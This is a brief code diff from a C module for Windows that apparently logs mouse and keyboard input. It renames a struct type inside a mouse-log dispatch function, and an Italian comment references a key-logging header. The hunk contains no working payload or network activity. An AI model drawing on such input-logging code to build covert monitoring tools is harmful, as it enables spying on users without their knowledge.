@@ -10,8 +10,8 @@ DWORD __stdcall PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 	int xPos, yPos;
 	HWND hwnd = (HWND) dwFlags;
 
-	key_params_struct *key_params; // XXX Definita in HM_KeyLog.h
-	key_params = (key_params_struct *)msg;
+	KEY_PARAMS *key_params; // XXX Definita in HM_KeyLog.h
+	key_params = (KEY_PARAMS *)msg;
 	
 	xPos = GET_X_LPARAM(key_params->lprm); 
 	yPos = GET_Y_LPARAM(key_params->lprm); 
